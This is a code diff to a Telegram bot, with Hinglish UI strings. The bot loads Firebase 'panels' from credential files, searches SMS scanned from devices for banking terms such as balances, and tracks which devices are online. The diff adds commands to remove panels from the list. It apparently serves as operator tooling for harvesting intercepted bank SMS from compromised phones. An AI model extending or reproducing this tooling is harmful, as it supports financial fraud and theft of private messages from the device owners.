@@ -5,6 +5,8 @@ import { join } from 'path';
 import { parseTxtCredentials, fetchAllPanels } from './lib/panelCore.mjs';
 import { parseSearchCommand, runSearch, searchHelpText } from './lib/searchRunner.mjs';
 import { runFirebaseScan } from './lib/panelScan.mjs';
+import { removePanelsFromList, urlsFromRemoveText } from './lib/panelRemove.mjs';
+import { normalizeFirebaseUrl } from './lib/panelCore.mjs';
 import {
   extractSearchKeywords,
   tierFromRest,
@@ -62,6 +64,7 @@ bot.start(ctx => {
       '🔎 `/search` — menu\n' +
       '⚡ `/search avl/bal, bank online` → tap options\n' +
       '🔥 `/fbscan` — fast online/offline report (no SMS)\n' +
+      '🗑 `/removefb` — Firebase hatao\n' +
       '/status · /done',
     { parse_mode: 'Markdown' }
   );
@@ -96,8 +99,25 @@ bot.command('add', async ctx => {
 
 bot.on('document', async ctx => {
   const cap = (ctx.message.caption || '').toLowerCase();
+  if (cap.includes('removefb') || cap === 'rm') {
+    try {
+      const link = await ctx.telegram.getFileLink(ctx.message.document.file_id);
+      const res = await fetch(link.href);
+      const text = await res.text();
+      const urls = urlsFromRemoveText(text);
+      if (!urls.length) return ctx.reply('File mein Firebase URL nahi mila.');
+      const { panels, removed } = removePanelsFromList(globalPanels, urls);
+      globalPanels = panels;
+      savePanels(globalPanels);
+      return ctx.reply(`🗑 Hatae: *${removed}*\nBaki panels: *${globalPanels.length}*`, {
+        parse_mode: 'Markdown',
+      });
+    } catch (e) {
+      return ctx.reply('File fail: ' + e.message);
+    }
+  }
   if (!cap.includes('addtxt') && !cap.includes('/fb') && cap !== 'fb') {
-    return ctx.reply('Caption: `addtxt` ya `/fb`', { parse_mode: 'Markdown' });
+    return ctx.reply('Caption: `addtxt` | `removefb`', { parse_mode: 'Markdown' });
   }
   try {
     const link = await ctx.telegram.getFileLink(ctx.message.document.file_id);
@@ -160,7 +180,8 @@ async function executeSearch(ctx, opts) {
         prog.panelsDone >= prog.panelsTotal && prog.panelsTotal > 0;
       if (!isLast && now - lastProgEdit < 2500) return;
       lastProgEdit = now;
-      const msg = `📥 DBs ${prog.panelsDone}/${prog.panelsTotal}\n📌 SMS scanned: ${prog.devices} · match: ${prog.matched}`;
+      const phase = prog.phase === 'sms' ? '📌 SMS' : '📥 DB';
+      const msg = `${phase} · DBs ${prog.panelsDone}/${prog.panelsTotal}\nDevices: ${prog.devices} · match: ${prog.matched}`;
       ctx.telegram.editMessageText(ctx.chat.id, status.message_id, undefined, msg).catch(() => {});
     });
 
@@ -332,6 +353,34 @@ bot.command('online', ctx => {
   if (!cached?.devices?.length) return ctx.reply('Pehle /search.');
   const online = cached.devices.filter(d => d.status);
   ctx.reply(`Online: ${online.length}`);
+});
+
+bot.command('removefb', async ctx => {
+  const arg = ctx.message.text.replace(/^\/removefb\s*/i, '').trim();
+  if (!arg || arg === 'help') {
+    return ctx.reply(
+      '🗑 *Remove Firebase*\n\n' +
+        '`/removefb all` — sab clear\n' +
+        '`/removefb https://xxx.firebaseio.com` — ek URL\n' +
+        'File + caption `removefb` — list se hatao\n\n' +
+        `Ab loaded: *${globalPanels.length}*`,
+      { parse_mode: 'Markdown' }
+    );
+  }
+  if (/^(all|clear|sab)$/i.test(arg)) {
+    const n = globalPanels.length;
+    globalPanels = [];
+    savePanels(globalPanels);
+    return ctx.reply(`🗑 ${n} panels clear. Total: 0`);
+  }
+  const url = normalizeFirebaseUrl(arg.split(/\s/)[0]);
+  const { panels, removed } = removePanelsFromList(globalPanels, [url]);
+  if (!removed) {
+    return ctx.reply('Ye URL list mein nahi thi.');
+  }
+  globalPanels = panels;
+  savePanels(globalPanels);
+  ctx.reply(`🗑 Removed 1. Baki: *${globalPanels.length}*`, { parse_mode: 'Markdown' });
 });
 
 /** Fast Firebase scan — automatic-tool jaisa (clients only, TXT files) */
